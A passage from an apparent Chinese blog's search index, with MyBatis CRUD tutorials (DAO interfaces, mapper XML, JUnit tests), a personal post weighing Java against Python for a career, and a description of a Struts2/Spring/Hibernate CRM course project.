getAddress() {        return address;    }    @Override    public String toString() {        return &quot;User{&quot; +                &quot;id=&quot; + id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, birthday=&quot; + birthday +                &quot;, sex=&#39;&quot; + sex + &#39;\&#39;&#39; +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;}&#39;;    }}</code></pre><h2 id="编写DAO层接口"><a href="#编写DAO层接口" class="headerlink" title="编写DAO层接口"></a>编写DAO层接口</h2><pre><code>package dao;import domain.QueryVo;import domain.User;import java.util.List;/*    用户持久层接口*/public interface UserDao {    /**    * @Description: 查询所有用户    * @Param: []    * @return: java.util.List&lt;domain.User&gt;    * @Author: Chen    */    List&lt;User&gt; findAll();    /**    * @Description: 保存用户    * @Param: []    * @return: void    * @Author: Chen    */    void saveUser(User user);    /**    * @Description: 更新用户    * @Param: [user]    * @return: void    * @Author: Chen    */    void updateUser(User user);    /*        根据ID删除用户    */    void deleteUser(Integer userId);    //根据ID查询用户    User findById(Integer userId);    //模糊查询根据名称查询用户信息    List&lt;User&gt; findByName(String userName);    //查询总用户数    int findTotal();    //根据QueryVO查询中的条件查询用户    List&lt;User&gt; findUserByVo(QueryVo vo);}</code></pre><h2 id="在UserDao的映射配置文件中进行配置"><a href="#在UserDao的映射配置文件中进行配置" class="headerlink" title="在UserDao的映射配置文件中进行配置"></a>在UserDao的映射配置文件中进行配置</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--id:哪个方法namespace:确定该方法在哪个DAO接口resultType:封装哪个实体类parameterType:参数类型--&gt;&lt;mapper namespace=&quot;dao.UserDao&quot;&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;domain.User&quot;&gt;        select * from user;    &lt;/select&gt;    &lt;!--保存用户--&gt;    &lt;insert id=&quot;saveUser&quot; parameterType=&quot;domain.User&quot;&gt;        &lt;!--配置保存时获取插入的 id        keyColumn:数据库的ID值        keyProperty:对应的属性名称        resultType:返回值类型        order:插入后的行为        #{field}:OGNL表达式        --&gt;        &lt;selectKey keyColumn=&quot;id&quot; keyProperty=&quot;id&quot; order=&quot;AFTER&quot; resultType=&quot;java.lang.Integer&quot;&gt;            select last_insert_id();        &lt;/selectKey&gt;        insert into user(username,address,sex,birthday) values(#{username},#{address},#{sex},#{birthday});    &lt;/insert&gt;    &lt;!--更新用户--&gt;    &lt;update id=&quot;updateUser&quot; parameterType=&quot;domain.User&quot;&gt;        update user set username=#{username},address=#{address},sex=#{sex},birthday=#{birthday} where id=#{id};    &lt;/update&gt;    &lt;!--删除用户--&gt;    &lt;delete id=&quot;deleteUser&quot; parameterType=&quot;java.lang.Integer&quot;&gt;        delete from user where id=#{id};    &lt;/delete&gt;    &lt;!--根据ID查询用户信息--&gt;    &lt;select id=&quot;findById&quot; parameterType=&quot;java.lang.Integer&quot; resultType=&quot;domain.User&quot;&gt;        select * from user where id=#{id};    &lt;/select&gt;    &lt;!--根据名称模糊查询--&gt;    &lt;select id=&quot;findByName&quot; parameterType=&quot;String&quot; resultType=&quot;domain.User&quot;&gt;        select * from user where username like #{username};    &lt;/select&gt;    &lt;!--查询总用户数--&gt;    &lt;select id=&quot;findTotal&quot; resultType=&quot;java.lang.Integer&quot;&gt;        select count(id) from user;    &lt;/select&gt;    &lt;!--根据QueryVO的条件查询用户    #{user.username}:OGNL表达式        user:QueryVo中的属性,也就是User对象        username:user对象中的属性    --&gt;    &lt;select id=&quot;findUserByVo&quot; parameterType=&quot;domain.QueryVo&quot; resultType=&quot;domain.User&quot;&gt;        select * from user where username like #{user.username};    &lt;/select&gt;&lt;/mapper&gt;</code></pre><h2 id="编写测试类"><a href="#编写测试类" class="headerlink" title="编写测试类"></a>编写测试类</h2><pre><code>import dao.UserDao;import domain.QueryVo;import domain.User;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import org.junit.After;import org.junit.Before;import org.junit.Test;import java.io.InputStream;import java.util.Date;import java.util.List;/*** @description: MyBatisCRUD* @author: Mr.Wang**/public class MyBatisTest {    private InputStream in;    private SqlSession sqlSession;    SqlSessionFactory factory;    SqlSessionFactoryBuilder builder;    private UserDao userDao;    /**    * @Description: 初始化方法    * @Param: []    * @return: void    */    @Before //该注解用于在测试方法执行之前执行    public void init() throws Exception {        //1.读取配置文件,生成字节输入流        in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);        //2.创建sqlSessionFactory        builder = new SqlSessionFactoryBuilder();        //3.使用构建者创建工厂对象 SqlSessionFactory        factory = builder.build(in);        //4.使用 SqlSessionFactory 生产SqlSession 对象        sqlSession = factory.openSession();        //5.使用 SqlSession 创建 dao 接口的代理对象        userDao = sqlSession.getMapper(UserDao.class);    }    /**    * @Description: 释放资源和提交事务方法    */    @After  //该注解用于在测试方法执行之后执行    public void destroy() throws Exception {        //提交事务        sqlSession.commit();        sqlSession.close();        in.close();    }    /**    * @Description: 测试查询所有方法    * @Param: []    * @return: void    * @Author: Chen    */    @Test    public void testFindAll() {        //使用代理对象执行查询所有方法        List&lt;User&gt; users = userDao.findAll();        for (User user : users        ) {            System.out.println(user);        }    }    @Test    public void testSave() {        User user = new User();     //当前时间        user.setAddress(&quot;北京西二旗&quot;);        user.setSex(&quot;女&quot;);        user.setBirthday(new Date());        user.setUsername(&quot;刘龙飞&quot;);        //执行保存方法        userDao.saveUser(user);    }    //更新用户    @Test    public void testUpdate() {        User user = new User();        user.setId(45);        user.setAddress(&quot;北京天安门&quot;);        user.setSex(&quot;男&quot;);        user.setBirthday(new Date());//当前时间        user.setUsername(&quot;张小飞&quot;);        //执行更新方法        userDao.updateUser(user);    }    // 删除用户    @Test    public void testDelete() {        //执行删除方法        userDao.deleteUser(50);    }    // 根据ID查询用户    @Test    public void testfindById() {        User user = userDao.findById(41);        System.out.println(user);    }    // 模糊查询根据名称查询用户信息    @Test    public void testfindByName() {        //执行查询方法        List&lt;User&gt; users = userDao.findByName(&quot;小%&quot;);        for (User user : users        ) {            System.out.println(user);        }    }    // 查询总用户数    @Test    public void testfindTotal() {        Integer count = userDao.findTotal();        System.out.println(count);    }    //保存用户后返回用户ID    @Test    public void testSaveReturnId() {        User user = new User();     //当前时间        user.setAddress(&quot;北京西二旗&quot;);        user.setSex(&quot;女&quot;);        user.setBirthday(new Date());        user.setUsername(&quot;保存后返回用户id&quot;);        System.out.println(&quot;保存前:&quot; + user);        //执行保存方法        userDao.saveUser(user);        System.out.println(&quot;保存后:&quot; + user);    }    //根据QueryVO查询中的条件查询用户    @Test    public void testFindByQueryVo() {        QueryVo queryVo = new QueryVo();        User user = new User();        user.setUsername(&quot;小%&quot;);        queryVo.setUser(user);        List&lt;User&gt; users = userDao.findUserByVo(queryVo);        for (User u :                users        ) {            System.out.println(u);        }    }}</code></pre><h1 id="sql语句标签的一些属性说明"><a href="#sql语句标签的一些属性说明" class="headerlink" title="sql语句标签的一些属性说明"></a>sql语句标签的一些属性说明</h1><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>id:DAO层接口的方法名</p><p>parameterType:用于指定传入的参数类型</p><p>resultType:用于指定结果集</p><p><strong>#{}:</strong>OGNL表达式,语法格式{对象.对象}</p><h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><p>id:DAO层接口的方法名</p><p>parameterType:代表参数类型,因为传入的参数是一个类对象,所以要写类的全限定名</p><p><strong>#{}</strong>:在insert标签中,我们传入的参数是一个User对象,所以此处应该写User对象中的属性名称.</p><p>注意:<strong>#{user.username}它会先去找 user 对象，然后在 user 对象中找到 username属性，并调用</strong>getUsername()方法把值取出来。如果parameterType属性上指定了实体类名称，可以省略对象名,而直接写对象的属性名称.</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>在进行insert,update,delete操作时必须要commit.</p><h2 id="模糊查询需要注意的事项"><a href="#模糊查询需要注意的事项" class="headerlink" title="模糊查询需要注意的事项"></a>模糊查询需要注意的事项</h2><p>在配置文件中没有加入%来作为模糊查询的条件，所以在<strong>传入字符串实参时</strong>，就需要给定模糊查询的标识%。配置文件中的#{username}也只是一个占位符，所以SQL语句显示为”?”.</p>]]></content>
      
      
      <categories>
          
          <category> MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>计划和迷茫</title>
      <link href="/2019/05/12/ji-hua-he-mi-mang/"/>
      <url>/2019/05/12/ji-hua-he-mi-mang/</url>
      
        <content type="html"><![CDATA[<h1 id="设定目标"><a href="#设定目标" class="headerlink" title="设定目标"></a>设定目标</h1><p>目标毕业月薪8000,如何实现?<br>学习Java开发,精通当下主流技术.<br>什么叫做主流技术,招聘网站上的8000工资需要用到的技术.</p><h1 id="制定计划"><a href="#制定计划" class="headerlink" title="制定计划"></a>制定计划</h1><p>如何实现目标呢?</p><p>将技术要求进行分类,一步一步的进行实现,迭代再迭代.</p><h1 id="迷茫期"><a href="#迷茫期" class="headerlink" title="迷茫期"></a>迷茫期</h1><p>近半年我陷入了自我的迷茫期,突然发现不知道自己将来要干啥,玩儿了近两年的Python,不能算得上是精通,至少收获了一些技能</p><pre><code>爬虫,web.</code></pre><p>今天将自己关到屋子里开始想我为什么迷茫,到底想要什么?</p><p>发现自己迷茫的原因在于在Java语言和Python语言的选择上,</p><pre><code>Python作为当下最火的一门编程语言,简单易学,应用非常广,1运维,2web开发,3当前最火的人工智能,4大数据,5网络安全但是我所知道的在这些个工作岗位中,Python仅仅是一门语言而已,其核心并不在于Python,就拿在人工智能来说,如果只会Python而不知道统计、运筹、数学、应用数学、信息技术等专业的内容,而且还需要一定的学历门槛(可以去招聘网站验证),是远远达不到任职要求的.</code></pre><p>虽然日后可能用不到Python,但是我不后悔我学过Python,因为Python代码真的非常优雅.</p><p>虽然我所学专业是Java,但是我太清楚自己对Java的熟悉程度了.</p><p>当下学校课程体系,和招聘岗位的要求差别太大.</p><p>课程落后太多.</p><ol><li><p>Java基础没有最最重要的几个知识点:</p><ol><li>Java多线程</li><li>Java8新特性</li><li>Java网络编程</li></ol></li><li><p>框架部分:当下最主流的SpringMVC,SpringMVC,Mybatis框架没有,学的还是几年前的老架构S(Struts2)S(Spring)H(Hibernate)</p></li><li>包管理工具:Maven</li><li>版本控制工具:不教Git最起码要了解点儿SVN吧?</li><li>当下最流行的框架:Lucene,SpringDataJPA,SpringBoot</li></ol>]]></content>
      
      
      <categories>
          
          <category> 生活琐碎 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MyBatis入门使用</title>
      <link href="/2019/05/06/mybatis-ru-men-shi-yong/"/>
      <url>/2019/05/06/mybatis-ru-men-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建MyBatis开发环境"><a href="#搭建MyBatis开发环境" class="headerlink" title="搭建MyBatis开发环境"></a>搭建MyBatis开发环境</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p><img src="https://s2.ax1x.com/2019/05/06/EDpnw8.png" alt="EDpnw8.png"><br><img src="https://s2.ax1x.com/2019/05/06/EDpZOP.png" alt="EDpZOP.png"><br><img src="https://s2.ax1x.com/2019/05/06/EDpmef.png" alt="EDpmef.png"></p><h2 id="数据库准备"><a href="#数据库准备" class="headerlink" title="数据库准备"></a>数据库准备</h2><p>新建数据库并插入测试数据</p><pre><code>use chuanzhijavaCREATE TABLE user (id int(11) NOT NULL auto_increment,username varchar(32) NOT NULL COMMENT &#39;用户名称&#39;,birthday datetime default NULL COMMENT &#39;生日&#39;,sex char(1) default NULL COMMENT &#39;性别&#39;,address varchar(256) default NULL COMMENT &#39;地址&#39;,PRIMARY KEY (id)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert  into `user`(`id`,`username`,`birthday`,`sex`,`address`) values (41,&#39;老王&#39;,&#39;2018-02-27 17:47:08&#39;,&#39;男&#39;,&#39;北京&#39;),(42,&#39;小二王&#39;,&#39;2018-03-02 15:09:37&#39;,&#39;女&#39;,&#39;北京金燕龙&#39;),(43,&#39;小二王&#39;,&#39;2018-03-04 11:34:34&#39;,&#39;女&#39;,&#39;北京金燕龙&#39;),(45,&#39;传智播客&#39;,&#39;2018-03-04 12:04:06&#39;,&#39;男&#39;,&#39;北京金燕龙&#39;),(46,&#39;老王&#39;,&#39;2018-03-07 17:37:26&#39;,&#39;男&#39;,&#39;北京&#39;),(48,&#39;小马宝莉&#39;,&#39;2018-03-08 11:44:00&#39;,&#39;女&#39;,&#39;北京修正&#39;);</code></pre><h2 id="在Maven中配置Mybatis和其他坐标"><a href="#在Maven中配置Mybatis和其他坐标" class="headerlink" title="在Maven中配置Mybatis和其他坐标"></a>在Maven中配置Mybatis和其他坐标</h2><p>我这里配置的有Junit,Mybatis,SQL(注意版本号哦)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.chen&lt;/groupId&gt;    &lt;artifactId&gt;day1_mybaties1&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;!--打包方式--&gt;    &lt;packaging&gt;jar&lt;/packaging&gt;    &lt;!--导入坐标--&gt;    &lt;dependencies&gt;        &lt;!--MyBitais坐标--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;            &lt;version&gt;3.4.5&lt;/version&gt;        &lt;/dependency&gt;        &lt;!--Mysql数据库坐标,根据自己的Mysql数据库版本填写--&gt;        &lt;dependency&gt;            &lt;groupId&gt;mysql&lt;/groupId&gt;            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;            &lt;version&gt;8.0.15&lt;/version&gt;        &lt;/dependency&gt;        &lt;!--log4j--&gt;        &lt;dependency&gt;            &lt;groupId&gt;log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j&lt;/artifactId&gt;            &lt;version&gt;1.2.12&lt;/version&gt;        &lt;/dependency&gt;        &lt;!--单元测试junit--&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.10&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><h2 id="创建实体类和DAO接口"><a href="#创建实体类和DAO接口" class="headerlink" title="创建实体类和DAO接口"></a>创建实体类和DAO接口</h2><p>实体类</p><pre><code>package domain;import java.io.Serializable;import java.util.Date;public class User implements Serializable {    /**    * @program: day1_mybaties1    * @description: 用户的实体类    * @author: Mr.Wang    * @create: 2019-05-06 12:25    **/    //字段名字要和数据库中的字段名字一样    private Integer id;    private String username;    private Date birthday;    private String sex;    private String address;    public void setId(Integer id) {        this.id = id;    }    public void setUsername(String username) {        this.username = username;    }    public void setBirthday(Date birthday) {        this.birthday = birthday;    }    public void setSex(String sex) {        this.sex = sex;    }    public void setAddress(String address) {        this.address = address;    }    public Integer getId() {        return id;    }    public String getUsername() {        return username;    }    public Date getBirthday() {        return birthday;    }    public String getSex() {        return sex;    }    public String getAddress() {        return address;    }}</code></pre><p>创建Dao接口</p><p>定义一个查询所有的方法</p><pre><code>package dao;import domain.User;import org.apache.ibatis.annotations.Select;import java.util.List;public interface UserDao {    /**    * @Description: 查询所有的方法    */    List&lt;User&gt; findAll();}</code></pre><h2 id="创建Mybatis的主配置文件-SqlMapConfig-xml"><a href="#创建Mybatis的主配置文件-SqlMapConfig-xml" class="headerlink" title="创建Mybatis的主配置文件(SqlMapConfig.xml)"></a>创建Mybatis的主配置文件(SqlMapConfig.xml)</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;!--Mybatis主配置文件--&gt;&lt;configuration&gt;    &lt;!--配置环境--&gt;    &lt;environments default=&quot;mysql&quot;&gt;        &lt;!--配置mysql环境--&gt;        &lt;environment id=&quot;mysql&quot;&gt;            &lt;!--配置事务的类型--&gt;            &lt;transactionManager type=&quot;JDBC&quot;&gt;&lt;/transactionManager&gt;            &lt;!--配置连接池pooled,连接池有很多,这里使用的是pooled--&gt;            &lt;dataSource type=&quot;POOLED&quot;&gt;                &lt;!--配置连接数据库的基本信息--&gt;                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.cj.jdbc.Driver&quot;/&gt;                &lt;property name=&quot;url&quot;                        value=&quot;jdbc:mysql://localhost:3306/chuanzhijava?useUnicode=true&amp;amp;characterEncoding=utf-8&amp;amp;useSSL=false&amp;amp;serverTimezone=UTC&quot;/&gt;                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;                &lt;property name=&quot;password&quot; value=&quot;LiuChen0.&quot;/&gt;            &lt;/dataSource&gt;        &lt;/environment&gt;    &lt;/environments&gt;    &lt;!--指定映射配置文件的位置,映射配置文件指的是每个DAO独立的配置文件--&gt;    &lt;mappers&gt;        &lt;mapper resource=&quot;dao/UserDao.xml&quot;/&gt;    &lt;/mappers&gt;&lt;/configuration&gt;</code></pre><h2 id="创建映射配置文件"><a href="#创建映射配置文件" class="headerlink" title="创建映射配置文件"></a>创建映射配置文件</h2><p><strong>创建位置：必须和持久层接口在相同的包中。</strong><br><strong>名称：必须以持久层接口名称命名文件名，扩展名是.xml</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;dao.UserDao&quot;&gt;    &lt;!--配置查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;domain.User&quot;&gt;        select * from user    &lt;/select&gt;&lt;/mapper&gt;</code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在idea中创建目录的时候，目录和包是不一样的</p><pre><code>包在创建时：com.chen.dao它是三级结构目录在创建时：com.chen.dao是一级目录</code></pre><p><strong>mybatis的映射配置文件位置必须和dao接口的包结构相同</strong></p><p><strong>映射配置文件的mapper标签namespace属性的取值必须是dao接口的全限定类名</strong></p><pre><code>&lt;mapper namespace=&quot;dao.UserDao&quot;&gt;    &lt;!--配置查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;domain.User&quot;&gt;        select * from user    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>映射配置文件的操作配置（select），id属性的取值必须是dao接口的方法名</p><pre><code>&lt;select id=&quot;findAll&quot; resultType=&quot;domain.User&quot;&gt;        select * from user&lt;/select&gt;</code></pre><h1 id="编写测试类"><a href="#编写测试类" class="headerlink" title="编写测试类"></a>编写测试类</h1><pre><code>package test;import domain.User;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import dao.UserDao;import java.io.InputStream;import java.util.List;public class MyBatisTest {    /**    * @program: day1_mybaties1    * @description: 第一个Mybatis测试类    * @author: Mr.Wang    * @create: 2019-05-06 14:03    **/    //入门案例    public static void main(String[] args) throws Exception {        //1.读取配置文件        InputStream in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);        //2.创建sqlSessionFactory        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();        //3.使用构建者创建工厂对象 SqlSessionFactory        SqlSessionFactory factory = builder.build(in);        //4.使用 SqlSessionFactory 生产SqlSession 对象        SqlSession session = factory.openSession();        //5.使用 SqlSession 创建 dao 接口的代理对象        UserDao userdao = session.getMapper(UserDao.class);        //6.使用代理对象执行查询所有方法        List&lt;User&gt; users = userdao.findAll();        for (User user : users        ) {            System.out.println(user.getId());            System.out.println(user.getUsername());            System.out.println(user.getAddress());            System.out.println(user.getSex());            System.out.println(&quot;--------------------&quot;);        }        //7.释放资源        session.close();        in.close();    }}</code></pre><h2 id="项目最终文件结构"><a href="#项目最终文件结构" class="headerlink" title="项目最终文件结构"></a>项目最终文件结构</h2><p><img src="https://s2.ax1x.com/2019/05/06/EDSLW9.png" alt="EDSLW9.png"></p><pre><code>│  MyBatisCode.iml│  pom.xml│├─src│  ├─main│  │  ├─java│  │  │  ├─dao│  │  │  │      UserDao.java│  │  │  ││  │  │  └─domain│  │  │          User.java│  │  ││  │  └─resources│  │      │  log4j.properties│  │      │  SqlMapConfig.xml│  │      ││  │      └─dao│  │              UserDao.xml│  ││  └─test│      └─java│          └─test│                  MyBatisTest.java</code></pre><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://s2.ax1x.com/2019/05/06/EDSjQ1.png" alt="EDSjQ1.png"></p><h1 id="基于注解的MyBatis使用"><a href="#基于注解的MyBatis使用" class="headerlink" title="基于注解的MyBatis使用"></a>基于注解的MyBatis使用</h1><h2 id="在持久层接口中添加注解"><a href="#在持久层接口中添加注解" class="headerlink" title="在持久层接口中添加注解"></a>在持久层接口中添加注解</h2><p>在dao接口的方法上使用@Select注解，并且指定SQL语句</p><pre><code>public interface UserDao {    /**    * @Description: 查询所有的接口    */    @Select(&quot;select * from user&quot;)    List&lt;User&gt; findAll();}</code></pre><h2 id="修改SqlMapConfig-xml"><a href="#修改SqlMapConfig-xml" class="headerlink" title="修改SqlMapConfig.xml"></a>修改SqlMapConfig.xml</h2><p>在SqlMapConfig.xml中的mapper配置时，<strong>使用class属性指定dao接口的全限定类名</strong></p><pre><code>注解方式&lt;mappers&gt;        &lt;mapper class=&quot;dao.UserDao&quot;/&gt;&lt;/mappers&gt;</code></pre><p><strong>注意在使用基于注解的 Mybatis 配置时，务必要移除 xml的映射配置（UserDao.xml）。</strong></p><p><a href="https://imgchr.com/i/EDCYIU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/06/EDCYIU.th.png" alt="EDCYIU.th.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSHCRM项目说明</title>
      <link href="/2019/04/24/sshcrm-xiang-mu-shuo-ming/"/>
      <url>/2019/04/24/sshcrm-xiang-mu-shuo-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="项目展示"><a href="#项目展示" class="headerlink" title="项目展示"></a>项目展示</h1><p><img src="https://s2.ax1x.com/2019/04/24/EVN0b9.md.png" alt="EVN0b9.md.png"><br><img src="https://s2.ax1x.com/2019/04/24/EVNwDJ.md.png" alt=""><br><img src="https://s2.ax1x.com/2019/04/24/EVNdu4.md.png" alt=""><br><img src="https://s2.ax1x.com/2019/04/24/EVNdu4.md.png" alt=""><br><img src="https://s2.ax1x.com/2019/04/24/EVNDER.md.png" alt=""></p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>JDK:1.8.0_201Server:Tomcat8.5DBMS:Mysql8.0.15架构:SSH    Hibernate5.0.7    Spring4.2.4    Struts2.3.24</code></pre><h2 id="项目所需Jar包"><a href="#项目所需Jar包" class="headerlink" title="项目所需Jar包"></a>项目所需Jar包</h2><p>包含Hibernate,spring,Struts</p><pre><code>antlr-2.7.7.jarasm-3.3.jarasm-commons-3.3.jarasm-tree-3.3.jarc3p0-0.9.2.1.jarcom.springsource.org.aopalliance-1.0.0.jarcom.springsource.org.apache.commons.logging-1.1.1.jcom.springsource.org.apache.log4j-1.2.15.jarcom.springsource.org.aspectj.weaver-1.6.8.RELEASE.jcommons-beanutils-1.8.3.jarcommons-collections-3.2.1.jarcommons-fileupload-1.3.1.jarcommons-io-2.2.jarcommons-lang-2.5.jarcommons-lang3-3.2.jarcommons-logging-1.1.1.jardom4j-1.6.1.jarezmorph-1.0.6.jarfreemarker-2.3.22.jargeronimo-jta_1.1_spec-1.1.1.jarhibernate-c3p0-5.0.7.Final.jarhibernate-commons-annotations-5.0.1.Final.jarhibernate-core-5.0.7.Final.jarhibernate-jpa-2.1-api-1.0.0.Final.jarjandex-2.0.0.Final.jarjavassist-3.18.1-GA.jarjboss-logging-3.3.0.Final.jarjson-lib-2.4-jdk15.jarlog4j-1.2.16.jarlog4j-api-2.2.jarlog4j-core-2.2.jarmchange-commons-java-0.2.3.4.jarmysql-connector-java-8.0.13.jar         Mysql驱动包ognl-3.0.6.jarslf4j-api-1.6.1.jarslf4j-log4j12-1.7.2.jarspring-aop-4.2.4.RELEASE.jarspring-aspects-4.2.4.RELEASE.jarspring-beans-4.2.4.RELEASE.jarspring-context-4.2.4.RELEASE.jarspring-core-4.2.4.RELEASE.jarspring-expression-4.2.4.RELEASE.jarspring-jdbc-4.2.4.RELEASE.jarspring-orm-4.2.4.RELEASE.jarspring-test-4.2.4.RELEASE.jarspring-tx-4.2.4.RELEASE.jarspring-web-4.2.4.RELEASE.jarstruts2-core-2.3.24.jarstruts2-spring-plugin-2.3.24.jarxwork-core-2.3.24.jar</code></pre><h2 id="项目架构"><a href="#项目架构" class="headerlink" title="项目架构"></a>项目架构</h2><pre><code>│  applicationContext.xml│  jdbc.properties│  log4j.properties│  struts.xml│└─crm    ├─dao    │  │  BaseDao.java    │  │  BaseDictDao.java    │  │  CustomerDao.java    │  │  LinkManDao.java    │  │  SaleVisitDao.java    │  │  UserDao.java    │  │    │  └─impl    │          BaseDaoImpl.java    │          BaseDictDaoImple.java    │          CustomerDaoImpl.java    │          LinkManDaoImpl.java    │          SaleVisitDaoImpl.java    │          UserDaoImpl.java    │    ├─domain    │      BaseDict.hbm.xml    │      BaseDict.java    │      Customer.hbm.xml    │      Customer.java    │      LinkMan.hbm.xml    │      LinkMan.java    │      PageBean.java    │      SaleVisit.hbm.xml    │      SaleVisit.java    │      User.hbm.xml    │      User.java    │    ├─service    │  │  BaseDictService.java    │  │  CustomerService.java    │  │  LinkManService.java    │  │  SaleVisitService.java    │  │  UserService.java    │  │    │  └─impl    │          BaseDictServiceImpl.java    │          CustomerServiceImpl.java    │          LinkManServiceImpl.java    │          SaleVisitServiceImpl.java    │          UserServiceImpl.java    │    ├─utils    │      MD5Utils.java    │      UploadUtils.java    │    └─web        ├─action        │      BaseDictAction.java        │      CustomerAction.java        │      LinkManAction.java        │      SaleVisitAction.java        │      UserAction.java        │        └─interceptor                PrivilegeInteceptor.java</code></pre><h1 id="已完成功能"><a href="#已完成功能" class="headerlink" title="已完成功能"></a>已完成功能</h1><ol><li>用户登录,注册</li><li>用户登录的权限拦截</li><li>添加客户:客户信息的保存</li><li>查询客户:分页查询,条件查询</li><li>修改客户:对客户的基本信息的修改</li><li>删除客户:删除客户的时候级联删除客户的联系人</li><li>添加联系人:联系人的基本信息的保存</li><li>查询联系人:分页查询,条件查询</li><li>修改联系人:对联系人的基本信息进行修改</li><li>删除联系人</li><li>使用泛型将通用的DAO层代码进行抽取</li><li>客户拜访记录的查询</li><li>添加客户拜访记录</li><li>使用JQuery插件优化日期选择</li></ol><h1 id="项目下载链接"><a href="#项目下载链接" class="headerlink" title="项目下载链接"></a>项目下载链接</h1><pre><code>链接：https://pan.baidu.com/s/1pDuCIl-wU5gBnOXXfQIeFg 提取码：v20p</code></pre>]]></content>
      
      
      <categories>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java - Struts2 - Spring - Hibernate </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常用正则表达式总结</title>
      <link href="/2019/04/16/chang-yong-zheng-ze-biao-da-shi-zong-jie/"/>
      <url>/2019/04/16/chang-yong-zheng-ze-biao-da-shi-zong-jie/</url>
      
